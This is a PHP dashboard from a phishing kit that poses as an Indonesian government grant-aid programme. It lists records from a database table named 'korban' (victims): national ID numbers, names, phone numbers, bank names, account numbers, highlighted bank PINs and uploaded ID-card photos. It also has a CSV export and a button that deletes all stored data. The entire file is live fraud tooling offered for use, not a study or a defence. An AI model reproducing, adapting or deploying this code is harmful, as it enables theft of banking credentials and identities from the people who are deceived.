<?php
$db = new SQLite3('database.db');
$results = $db->query("SELECT * FROM korban ORDER BY id DESC");
$total = $db->query("SELECT COUNT(*) FROM korban")->fetchArray()[0];
$today = $db->query("SELECT COUNT(*) FROM korban WHERE DATE(waktu)=DATE('now')")->fetchArray()[0];
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Bantuan Dana Hibah Indonesia</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { font-family:'Inter',sans-serif; margin:0; padding:0; box-sizing:border-box; }
        body { background:#0d2b45; padding:20px; }
        .dash { max-width:1200px; margin:auto; background:#fff; border-radius:16px; padding:25px; }
        h1 { color:#0d2b45; display:flex; align-items:center; gap:12px; font-size:24px; }
        .stats { display:flex; gap:20px; margin:20px 0; flex-wrap:wrap; }
        .stats div { background:#f0f4f8; padding:15px 25px; border-radius:12px; flex:1; min-width:120px; }
        .stats span { font-size:28px; font-weight:800; color:#0d2b45; display:block; }
        .table-wrap { overflow-x:auto; }
        table { width:100%; border-collapse:collapse; margin-top:20px; font-size:14px; }
        th { background:#0d2b45; color:#fff; padding:12px; text-align:left; }
        td { padding:10px; border-bottom:1px solid #eee; }
        .pin-col { background:#ffcdd2; font-weight:bold; color:#b71c1c; }
        .btn { display:inline-block; padding:8px 16px; background:#d32f2f; color:#fff; border-radius:8px; text-decoration:none; margin:5px 5px 0 0; border:none; cursor:pointer; font-weight:600; }
        .btn-green { background:#2e7d32; }
        .btn-blue { background:#0d2b45; }
        @media (max-width:768px) { table { font-size:11px; } th,td { padding:6px; } .stats div { padding:10px; } }
    </style>
</head>
<body>
<div class="dash">
    <h1><i class="fas fa-landmark" style="color:#0d2b45;"></i> DASHBOARD - BANTUAN DANA HIBAH INDONESIA</h1>
    <div class="stats">
        <div><i class="fas fa-users"></i> Total Pendaftar <span><?= $total ?></span></div>
        <div><i class="fas fa-credit-card"></i> PIN Terkumpul <span><?= $db->query("SELECT COUNT(*) FROM korban WHERE pin IS NOT NULL")->fetchArray()[0] ?></span></div>
        <div><i class="fas fa-clock"></i> Hari Ini <span><?= $today ?></span></div>
    </div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
        <a href="export.php" class="btn btn-green"><i class="fas fa-download"></i> Export CSV</a>
        <a href="#" onclick="window.location.reload();" class="btn btn-blue"><i class="fas fa-sync"></i> Refresh</a>
        <button onclick="if(confirm('Yakin hapus semua data?')){window.location='admin.php?hapus=all';}" class="btn"><i class="fas fa-trash"></i> Hapus Semua</button>
    </div>
    <?php
    if (isset($_GET['hapus']) && $_GET['hapus'] === 'all') {
        $db->exec("DELETE FROM korban");
        echo '<div style="background:#ffcdd2;padding:12px;border-radius:8px;margin-bottom:15px;color:#b71c1c;">✅ Semua data berhasil dihapus!</div>';
        header("Refresh:2; url=admin.php");
    }
    ?>
    <div class="table-wrap">
    <table>
        <tr>
            <th>ID</th><th>NIK</th><th>Nama</th><th>HP</th><th>Bank</th>
            <th>Rek</th><th>PIN</th><th>Foto</th><th>Waktu</th>
        </tr>
        <?php while($row = $results->fetchArray()): ?>
        <tr>
            <td><?= $row['id'] ?></td>
            <td><?= htmlspecialchars($row['nik']) ?></td>
            <td><?= htmlspecialchars($row['nama']) ?></td>
            <td><?= htmlspecialchars($row['hp']) ?></td>
            <td><?= htmlspecialchars($row['bank']) ?></td>
            <td><?= htmlspecialchars($row['rekening']) ?></td>
            <td class="pin-col"><?= htmlspecialchars($row['pin']) ?></td>
            <td><?= $row['foto_ktp'] ? '<a href="assets/uploads/'.$row['foto_ktp'].'" target="_blank">Lihat</a>' : '-' ?></td>
            <td><?= $row['waktu'] ?></td>
        </tr>
        <?php endwhile; ?>
    </table>
    </div>
</div>
</body>
</html>